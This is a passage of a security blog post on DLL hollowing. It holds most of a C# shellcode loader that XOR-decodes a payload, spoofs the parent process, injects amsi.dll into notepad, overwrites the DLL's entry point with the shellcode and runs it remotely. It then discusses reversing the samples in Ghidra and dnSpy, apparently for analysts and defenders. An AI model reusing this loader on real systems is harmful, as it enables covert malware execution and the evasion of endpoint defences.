    <span class="hljs-number">79</span>				<span class="hljs-type">int</span> <span class="hljs-variable">base_offset</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;
    <span class="hljs-number">80</span>	            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; encoded_size; i++)
    <span class="hljs-number">81</span>	            {
    <span class="hljs-number">82</span>	                buf[i] = (<span class="hljs-type">byte</span>)(encoded[i]^xor[i%xor_size]);
    <span class="hljs-number">83</span>					<span class="hljs-keyword">if</span> (base_offset == -<span class="hljs-number">1</span> &amp;&amp; i &gt; <span class="hljs-number">3</span> &amp;&amp; (buf[i-<span class="hljs-number">3</span>]&amp;<span class="hljs-number">0xff</span>) == <span class="hljs-number">0xc0</span> &amp;&amp; (buf[i-<span class="hljs-number">2</span>]&amp;<span class="hljs-number">0xff</span>) == <span class="hljs-number">0xa8</span> &amp;&amp; (buf[i-<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xff</span>) == <span class="hljs-number">0xc8</span> &amp;&amp; (buf[i]&amp;<span class="hljs-number">0xff</span>) == <span class="hljs-number">0xdc</span>) 
    <span class="hljs-number">84</span>					{ 
    <span class="hljs-number">85</span>						base_offset = i-<span class="hljs-number">3</span>;
    <span class="hljs-number">86</span>					}
    <span class="hljs-number">87</span>	            }
    <span class="hljs-number">88</span>	            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">offset</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x0</span>; offset &lt; bytes_ip.Length; offset = offset + <span class="hljs-number">1</span>)
    <span class="hljs-number">89</span>	            {
    <span class="hljs-number">90</span>	                buf[base_offset + offset] = bytes_ip[offset];
    <span class="hljs-number">91</span>	            }
    <span class="hljs-number">92</span>	<span class="hljs-comment">/*************************/</span>
    <span class="hljs-number">93</span>	<span class="hljs-comment">//          End Shellcode deobfuscation</span>
    <span class="hljs-number">94</span>	<span class="hljs-comment">/*************************/</span>
    <span class="hljs-number">95</span>	
    <span class="hljs-number">96</span>	<span class="hljs-comment">/*************************/</span>
    <span class="hljs-number">97</span>	<span class="hljs-comment">//          Begin PPID Spoofing</span>
    <span class="hljs-number">98</span>	<span class="hljs-comment">/*************************/</span>
    <span class="hljs-number">99</span>				<span class="hljs-type">var</span> <span class="hljs-variable">startInfoEx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Utility</span>.Win32.STARTUPINFOEX();
   <span class="hljs-number">100</span>				<span class="hljs-type">var</span> <span class="hljs-variable">processInfo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Utility</span>.Win32.PROCESS_INFORMATION();
   <span class="hljs-number">101</span>				<span class="hljs-type">var</span> <span class="hljs-variable">lpValue</span> <span class="hljs-operator">=</span> Marshal.AllocHGlobal(IntPtr.Size);
   <span class="hljs-number">102</span>	            startInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(startInfoEx);
   <span class="hljs-number">103</span>	
   <span class="hljs-number">104</span>	            <span class="hljs-type">var</span> <span class="hljs-variable">processSecurity</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Utility</span>.Win32.SECURITY_ATTRIBUTES();
   <span class="hljs-number">105</span>	            <span class="hljs-type">var</span> <span class="hljs-variable">threadSecurity</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Utility</span>.Win32.SECURITY_ATTRIBUTES();
   <span class="hljs-number">106</span>	            processSecurity.nLength = Marshal.SizeOf(processSecurity);
   <span class="hljs-number">107</span>	            threadSecurity.nLength = Marshal.SizeOf(threadSecurity);
   <span class="hljs-number">108</span>	            <span class="hljs-type">var</span> <span class="hljs-variable">lpSize</span> <span class="hljs-operator">=</span> IntPtr.Zero;
   <span class="hljs-number">109</span>	            Utility.Win32.InitializeProcThreadAttributeList( IntPtr.Zero, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, ref lpSize);
   <span class="hljs-number">110</span>	            startInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
   <span class="hljs-number">111</span>	            Utility.Win32.InitializeProcThreadAttributeList( startInfoEx.lpAttributeList, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, ref lpSize);
   <span class="hljs-number">112</span>	
   <span class="hljs-number">113</span>	            Marshal.WriteIntPtr( lpValue, <span class="hljs-keyword">new</span> <span class="hljs-title class_">IntPtr</span>((<span class="hljs-type">long</span>)Utility.Win32.BinarySignaturePolicy.BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE));
   <span class="hljs-number">114</span>	
   <span class="hljs-number">115</span>	            Utility.Win32.UpdateProcThreadAttribute( startInfoEx.lpAttributeList, <span class="hljs-number">0</span>, (IntPtr)Utility.Win32.ProcThreadAttribute.MITIGATION_POLICY, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
   <span class="hljs-number">116</span>	
   <span class="hljs-number">117</span>	            <span class="hljs-type">var</span> <span class="hljs-variable">parentHandle</span> <span class="hljs-operator">=</span> IntPtr.Zero;
   <span class="hljs-number">118</span>	            string[] processes = {<span class="hljs-string">"explorer"</span>, <span class="hljs-string">"services"</span>,<span class="hljs-string">"svchosts"</span>};
   <span class="hljs-number">119</span>	            foreach (string process in processes)
   <span class="hljs-number">120</span>	            {
   <span class="hljs-number">121</span>	               <span class="hljs-keyword">try</span>
   <span class="hljs-number">122</span>	                {
   <span class="hljs-number">123</span>	                    Console.WriteLine(<span class="hljs-string">"trying Parent:: "</span> + process);
   <span class="hljs-number">124</span>	                    parentHandle = Process.GetProcessesByName(process)[<span class="hljs-number">0</span>].Handle;
   <span class="hljs-number">125</span>	                }
   <span class="hljs-number">126</span>	                <span class="hljs-keyword">catch</span> (Exception)
   <span class="hljs-number">127</span>	                {
   <span class="hljs-number">128</span>	                    <span class="hljs-keyword">continue</span>;
   <span class="hljs-number">129</span>	                }
   <span class="hljs-number">130</span>	                <span class="hljs-keyword">break</span>;
   <span class="hljs-number">131</span>	            }
   <span class="hljs-number">132</span>	            <span class="hljs-keyword">if</span> (parentHandle != IntPtr.Zero)
   <span class="hljs-number">133</span>	            {
   <span class="hljs-number">134</span>	                lpValue = Marshal.AllocHGlobal(IntPtr.Size);
   <span class="hljs-number">135</span>	                Marshal.WriteIntPtr(lpValue, parentHandle);
   <span class="hljs-number">136</span>	
   <span class="hljs-number">137</span>	                Utility.Win32.UpdateProcThreadAttribute( startInfoEx.lpAttributeList, <span class="hljs-number">0</span>, (IntPtr)Utility.Win32.ProcThreadAttribute.PARENT_PROCESS, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
   <span class="hljs-number">138</span>	            }
   <span class="hljs-number">139</span>	
   <span class="hljs-number">140</span>	            Utility.Win32.CreateProcess( <span class="hljs-literal">null</span>, <span class="hljs-string">"notepad"</span>, ref processSecurity, ref threadSecurity, <span class="hljs-literal">false</span>, Utility.Win32.CreationFlags.ExtendedStartupInfoPresent | Utility.Win32.CreationFlags.DetachedProcess, IntPtr.Zero, <span class="hljs-literal">null</span>, ref startInfoEx, out processInfo);
   <span class="hljs-number">141</span>	
   <span class="hljs-number">142</span>	<span class="hljs-comment">/*************************/</span>
   <span class="hljs-number">143</span>	<span class="hljs-comment">//          End PPID Spoofing</span>
   <span class="hljs-number">144</span>	<span class="hljs-comment">/*************************/</span>
   <span class="hljs-number">145</span>	
   <span class="hljs-number">146</span>	
   <span class="hljs-number">147</span>	<span class="hljs-comment">// Loadlibrary(amsi.dll)</span>
   <span class="hljs-number">148</span>	<span class="hljs-comment">// Parse out the entry point to the amsi.dll </span>
   <span class="hljs-number">149</span>	<span class="hljs-comment">// Change memory permissions for the are to allow read write</span>
   <span class="hljs-number">150</span>	<span class="hljs-comment">// Write shellcode to the entry point</span>
   <span class="hljs-number">151</span>	<span class="hljs-comment">// Change memory permissions for the entrypoint to the original value</span>
   <span class="hljs-number">152</span>	<span class="hljs-comment">// Create a new thread executing the entrypoint of the amsi.dll</span>
   <span class="hljs-number">153</span>	<span class="hljs-comment">// Loop for exit. Shellcode only runs when this program is open</span>
   <span class="hljs-number">154</span>	 
   <span class="hljs-number">155</span>	<span class="hljs-comment">/*************************/</span>
   <span class="hljs-number">156</span>	<span class="hljs-comment">// Load the requested Library  </span>
   <span class="hljs-number">157</span>	<span class="hljs-comment">/*************************/</span>
   <span class="hljs-number">158</span>	
   <span class="hljs-number">159</span>	            <span class="hljs-type">IntPtr</span> <span class="hljs-variable">hProcess</span> <span class="hljs-operator">=</span> processInfo.hProcess;
   <span class="hljs-number">160</span>	
   <span class="hljs-number">161</span>	            <span class="hljs-comment">// allocate memory, into the remote process memory, for the name of the dll to inject</span>
   <span class="hljs-number">162</span>	            <span class="hljs-type">IntPtr</span> <span class="hljs-variable">remoteDLLInjectName</span> <span class="hljs-operator">=</span> Utility.Win32.VirtualAllocEx(hProcess, IntPtr.Zero, (uint)dll_name.Length, (uint)<span class="hljs-number">0x1000</span>, (uint)<span class="hljs-number">4</span>); <span class="hljs-comment">// 0x4 == PAGE_READWRITE</span>
   <span class="hljs-number">163</span>	            <span class="hljs-keyword">if</span> ( remoteDLLInjectName == IntPtr.Zero) goto EXIT;
   <span class="hljs-number">164</span>	            Console.WriteLine(<span class="hljs-string">"[*] {0}: Dll Name Address in Remote Process: 0x{1:X}"</span>, dll_name, (Int64)remoteDLLInjectName);
   <span class="hljs-number">165</span>	
   <span class="hljs-number">166</span>	            <span class="hljs-type">IntPtr</span> <span class="hljs-variable">zero</span> <span class="hljs-operator">=</span> IntPtr.Zero;
   <span class="hljs-number">167</span>	            <span class="hljs-comment">// copy, into the remote process memory, the name of the dll to inject</span>
   <span class="hljs-number">168</span>	            Utility.Win32.WriteProcessMemory(hProcess, remoteDLLInjectName, Encoding.Default.GetBytes(dll_name), dll_name.Length, out zero);
   <span class="hljs-number">169</span>	
   <span class="hljs-number">170</span>	            <span class="hljs-type">IntPtr</span> <span class="hljs-variable">hKernel32</span> <span class="hljs-operator">=</span> Utility.Win32.GetModuleHandleA(<span class="hljs-string">"Kernel32"</span>);
   <span class="hljs-number">171</span>	            <span class="hljs-keyword">if</span> ( hKernel32 == IntPtr.Zero) goto EXIT;
   <span class="hljs-number">172</span>	
   <span class="hljs-number">173</span>	            <span class="hljs-type">IntPtr</span> <span class="hljs-variable">loadlibrary_addr</span> <span class="hljs-operator">=</span> Utility.Win32.GetProcAddress(hKernel32, <span class="hljs-string">"LoadLibraryA"</span>);
   <span class="hljs-number">174</span>	            <span class="hljs-type">IntPtr</span> <span class="hljs-variable">hDllThread</span> <span class="hljs-operator">=</span> Utility.Win32.CreateRemoteThread(hProcess, IntPtr.Zero, <span class="hljs-number">0</span>, loadlibrary_addr, remoteDLLInjectName, <span class="hljs-number">0</span>, out zero);
   <span class="hljs-number">175</span>	            <span class="hljs-keyword">if</span> ( hDllThread == IntPtr.Zero) goto EXIT;
   <span class="hljs-number">176</span>	
   <span class="hljs-number">177</span>	            Utility.Win32.WaitForSingleObject(hDllThread, <span class="hljs-number">1000</span>);
   <span class="hljs-number">178</span>	
   <span class="hljs-number">179</span>	            <span class="hljs-comment">// Loop through loaded modules lookin for the one we just created</span>
   <span class="hljs-number">180</span>	            <span class="hljs-type">long</span>[] module_array = <span class="hljs-keyword">new</span> <span class="hljs-title class_">long</span>[<span class="hljs-number">0x100</span>];
   <span class="hljs-number">181</span>	            <span class="hljs-type">uint</span> <span class="hljs-variable">module_sz</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
   <span class="hljs-number">182</span>	            Utility.Win32.EnumProcessModules(hProcess, module_array, (uint)module_array.Length, out module_sz);
   <span class="hljs-number">183</span>	            <span class="hljs-type">int</span> <span class="hljs-variable">number_of_modules</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>)(module_sz / <span class="hljs-number">8</span>);
   <span class="hljs-number">184</span>	
   <span class="hljs-number">185</span>	            <span class="hljs-type">IntPtr</span> <span class="hljs-variable">hModule</span> <span class="hljs-operator">=</span> IntPtr.Zero;
   <span class="hljs-number">186</span>	            <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">moduleName</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
   <span class="hljs-number">187</span>	            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &amp;lt; number_of_modules; i++) 
   <span class="hljs-number">188</span>	            {
   <span class="hljs-number">189</span>	                hModule = <span class="hljs-keyword">new</span> <span class="hljs-title class_">IntPtr</span>(module_array[i]);
   <span class="hljs-number">190</span>	                Utility.Win32.GetModuleBaseName(hProcess, hModule, moduleName, (uint)<span class="hljs-number">0x100</span>);
   <span class="hljs-number">191</span>	                <span class="hljs-keyword">if</span> (Utility.Win32.strcmp(moduleName.ToString(), <span class="hljs-string">"amsi.dll"</span>) == <span class="hljs-literal">true</span>) <span class="hljs-keyword">break</span>;
   <span class="hljs-number">192</span>	            }
   <span class="hljs-number">193</span>	
   <span class="hljs-number">194</span>	            <span class="hljs-keyword">if</span> (hModule == IntPtr.Zero) goto EXIT;
   <span class="hljs-number">195</span>	
   <span class="hljs-number">196</span>	            <span class="hljs-comment">// get DLL's AddressOfEntryPoint</span>
   <span class="hljs-number">197</span>	            <span class="hljs-type">uint</span> <span class="hljs-variable">remoteProcessMemory_sz</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x1000</span>;
   <span class="hljs-number">198</span>	            <span class="hljs-type">IntPtr</span> <span class="hljs-variable">remoteProcessMemory</span> <span class="hljs-operator">=</span> Utility.Win32.VirtualAllocExNuma(Utility.Win32.GetCurrentProcess(), IntPtr.Zero, remoteProcessMemory_sz, <span class="hljs-number">0x3000</span>, <span class="hljs-number">0x4</span>, <span class="hljs-number">0x0</span> );
   <span class="hljs-number">199</span>	            <span class="hljs-keyword">if</span> (remoteProcessMemory == IntPtr.Zero) goto EXIT;
   <span class="hljs-number">200</span>	
   <span class="hljs-number">201</span>	            Utility.Win32.ReadProcessMemory(hProcess, hModule, remoteProcessMemory , (<span class="hljs-type">int</span>)remoteProcessMemory_sz, out zero);
   <span class="hljs-number">202</span>	
   <span class="hljs-number">203</span>	            Console.WriteLine(<span class="hljs-string">"[*] Local Address of the copy of remote Address: 0x{0:X} 0x{1:X}"</span>, (Int64)remoteProcessMemory, (Int64)hModule);
   <span class="hljs-number">204</span>	            Utility.Win32.IMAGE_DOS_HEADER* mz_header = (Utility.Win32.IMAGE_DOS_HEADER*)remoteProcessMemory;	
   <span class="hljs-number">205</span>	            Console.WriteLine(<span class="hljs-string">"[*] {0} mz header PE OFffset 0x{1:X}"</span>, dll_name, mz_header-&gt;e_lfanew);
   <span class="hljs-number">206</span>	            Utility.Win32.IMAGE_NT_HEADERS64* pe_header = (Utility.Win32.IMAGE_NT_HEADERS64*)((UInt64)remoteProcessMemory + (UInt64)(mz_header-&gt;e_lfanew));
   <span class="hljs-number">207</span>	            Console.WriteLine(<span class="hljs-string">"[*] {0} pe_header address 0x{1:X}"</span>, dll_name, (Int64)pe_header);
   <span class="hljs-number">208</span>	            Console.WriteLine(<span class="hljs-string">"[*] {0} EntryPoint offset 0x{1:X}"</span>, dll_name, pe_header-&gt;OptionalHeader.AddressOfEntryPoint);
   <span class="hljs-number">209</span>	            <span class="hljs-type">IntPtr</span> <span class="hljs-variable">entryPoint</span> <span class="hljs-operator">=</span> (IntPtr)(pe_header-&gt;OptionalHeader.AddressOfEntryPoint + (UInt64)hModule);
   <span class="hljs-number">210</span>	            Console.WriteLine(<span class="hljs-string">"[*] Dll entryPoint at: 0x{0:X}\n"</span>, entryPoint);
   <span class="hljs-number">211</span>	
   <span class="hljs-number">212</span>	            <span class="hljs-comment">// Overwrite the DLL's entry point with the decoded shellcode</span>
   <span class="hljs-number">213</span>	            <span class="hljs-keyword">if</span> (Utility.Win32.WriteProcessMemory(hProcess, entryPoint, buf, encoded_size, out zero)) 
   <span class="hljs-number">214</span>	            {
   <span class="hljs-number">215</span>	                <span class="hljs-comment">// execute shellcode from inside the benign DLL</span>
   <span class="hljs-number">216</span>	                Utility.Win32.CreateRemoteThread(hProcess, IntPtr.Zero, <span class="hljs-number">0</span>, entryPoint, IntPtr.Zero, <span class="hljs-number">0</span>, out zero);
   <span class="hljs-number">217</span>	            }
   <span class="hljs-number">218</span>	EXIT:
   <span class="hljs-number">219</span>	            Console.WriteLine(<span class="hljs-string">"END"</span>); 
   <span class="hljs-number">220</span>	        }
   <span class="hljs-number">221</span>	    }
   <span class="hljs-number">222</span>	
   <span class="hljs-number">223</span>	} </code></pre><h3><span>1.5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>Reversing the Code</h3><p class="MsoNormal"><span>The C code discussed earlier was compiled into a Windows 64 bit executable using MinGW, then disassembled and decompiled with Ghidra. As you can see below, the Ghidra-generated source code is a very close match to the original.</span></p><p class="MsoNormal"><span>The figure below is the Ghidra decompilation of the first, simpler sample. As you can see, it does a pretty good job. Again, we didn't implement any type of anti-forensic or obfuscation.</span></p><div class="my-p56 flex justify-start"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig10_nusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281274&amp;s=dd07e43b6a826a8642be65b36dfdef62, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig10_nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281274&amp;s=e958d07ce87401ba6b756e37230a98e6 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig10_nusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281274&amp;s=798312c12653b005ee61e1d46575998b, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig10_nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281274&amp;s=9203ae5be1acafc6c0dee03133f5d1fd 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig10_nusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281274&amp;s=32d42dca16b1f8fef83eb8337754144e, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig10_nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281274&amp;s=e958d07ce87401ba6b756e37230a98e6 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig10_nusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281274&amp;s=2123cc3c88716bac7e2b47d268dc2eb0, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig10_nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281274&amp;s=9203ae5be1acafc6c0dee03133f5d1fd 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig10_nusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281274&amp;s=e0f3d2e00ee858e4ef84ce144bb778dc, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig10_nusbaum.png?w=1080&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281274&amp;s=be73f4fbfe77aa82d43bd5d08d38b0b0 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig10_nusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281274&amp;s=1a0503c7977e1a596a211851f6bf9275, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig10_nusbaum.png?w=1080&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281274&amp;s=4130c9a2f2f33af5cdd18a438ae4b73f 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig10_nusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281274&amp;s=338f3662e0acaee64ea7ba1c9bc4f822, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig10_nusbaum.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281274&amp;s=4cff87f35be779a1893826fff9d6796b 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig10_nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281274&amp;s=ed19d1d4f11a5a0ea9fb8f99b7d16f92, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig10_nusbaum.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281274&amp;s=49e68eaa4c611a17042a167bd8377117 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig10_nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281274&amp;s=ed19d1d4f11a5a0ea9fb8f99b7d16f92" loading="lazy" x-data="image({mq1024:{width:936,height:858},mq768:{width:936,height:858},mq320:{width:720,height:660},DEFAULT:{width:320,height:293}})" :width="getSize()" :height="getSize('height')" alt="" width="936" height="858" style="opacity: 1;"></picture></div><p class="MsoNormal"><span>The next figure is of the slightly more complex C example. Again, Ghidra does a good job of decompiling the executable to a C code. The below sample is only of the DLL hollowing.</span></p><div class="my-p56 flex justify-start"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig11_nusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281276&amp;s=5333e60eb709b899dacf1ccdbaef95a0, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig11_nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281276&amp;s=6564f6de1a689cef83eba70c198dcacd 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig11_nusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281276&amp;s=42288dc530101093db213c34956bf567, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig11_nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281276&amp;s=58a0dac8c99ac475c87ee8c35707f3da 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig11_nusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281276&amp;s=8004cf6957c04c95b37f2f3824192653, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig11_nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281276&amp;s=6564f6de1a689cef83eba70c198dcacd 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig11_nusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281276&amp;s=d7e8ea0692a59228d15e57af11161137, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig11_nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281276&amp;s=58a0dac8c99ac475c87ee8c35707f3da 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig11_nusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281276&amp;s=c7cc27b68b973e3ba86608c32e15bffb, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig11_nusbaum.png?w=1080&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281276&amp;s=287f58e4cdb3c78665078077e309819c 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig11_nusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281276&amp;s=a35635f6d21b0ed41e547339861a68e3, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig11_nusbaum.png?w=1080&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281276&amp;s=f22052f0a3d4a3a91f92685ff5ead85b 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig11_nusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281276&amp;s=ac23653f7534d6bbb1b405f3c1fd71b6, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig11_nusbaum.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281276&amp;s=8134b804676058ad69b299a79150b8fa 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig11_nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281276&amp;s=737165861ec19458c70a951fb3f38dc8, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig11_nusbaum.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281276&amp;s=9687a28026be209d0aac8677b6509bc1 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig11_nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281276&amp;s=737165861ec19458c70a951fb3f38dc8" loading="lazy" x-data="image({mq1024:{width:936,height:686},mq768:{width:936,height:686},mq320:{width:720,height:528},DEFAULT:{width:320,height:235}})" :width="getSize()" :height="getSize('height')" alt="" width="936" height="686" style="opacity: 1;"></picture></div><p class="MsoNormal">Reversing most C# code is simple with the tool dnSpy (<a href="https://github.com/dnSpy/dnSpy">https://github.com/dnSpy/dnSpy</a>). There are methods to hide or corrupt the EXE so that dnSpy cannot decompile it, but for the most part, attackers do not go to that extent.</p><p class="MsoNormal">To load the executable in dnSpy, simply drag and drop it onto the left pane. Once loaded, the pane will provide a tree listing of the components of the EXE.&nbsp;</p><p class="MsoNormal">The following image is the basic DLL hollowing example as shown in dnSpy. Again, it's very close to the original.</p><div class="my-p56 flex justify-start"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig12_nusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281278&amp;s=69e691316be27c2901b43e0c646abfcb, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig12_nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281278&amp;s=171cc74b168f4d3a2c6eb3a2dc5d8af9 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig12_nusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281278&amp;s=ffda5c50b6890ddfcd502efb9c106231, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig12_nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281278&amp;s=0fa8c041682583bedc1a86a44709e652 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig12_nusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281278&amp;s=b66b73a16870099359d6806b5cea711c, 